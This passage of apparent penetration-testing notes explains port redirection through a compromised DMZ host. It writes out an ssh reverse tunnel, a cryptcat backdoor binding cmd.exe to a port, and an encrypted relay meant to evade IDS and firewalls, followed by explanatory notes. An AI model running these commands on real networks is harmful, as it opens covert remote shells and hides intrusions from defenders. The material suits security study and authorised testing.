                loopback adapter on the DMZ host (ssh -R 80:[servicehost]:80 username@[dmzhost])
    3.9 Bypass IDS and firewall 
            (port 80 is nearly always open and a little more traffic will hardly be noticed) with cryptcat
        3.9.1 Create backdoor to decrypt communications from DMZ host 
                (cryptcat -k SECRETKEY -tlp 23 -e cmd.exe)

        3.9.4 Create listener on attack host to encrypt the traffic to DMZ host 
                (cryptcat -k SECRETKEY -lvp 23 <pipe | cryptcat -k SECRETKEY -t [dmzhost] 80 >pipe)
        3.9.5 Initiate a telnet connection to local forwarder 
                (telnet localhost 23)

## Notes

In port redirection, an adversary uses a machine with access to the internal network to pass traffic through a port on the firewall or access control list (ACL). The port in question normally denies traffic, but with redirection a hacker can bypass security measures and open a tunnel for communication.

For example, most organisations have a demilitarized zone (DMZ). Servers that communicate from the DMZ and the internal network may have a trust relationship established. The internal devices may be set up to trust information that is received from a DMZ server, and often also vv. When an adversary can compromise a DMZ server she can initiate a connection to the internal network. There are a lot of ways that port redirection can be used to get around obstacles.

* Leverage network access by compromising one system to attack another.
* Access a service that is being blocked by a firewall.
* Evading an intrusion detection system by sending traffic through an encrypted tunnel.
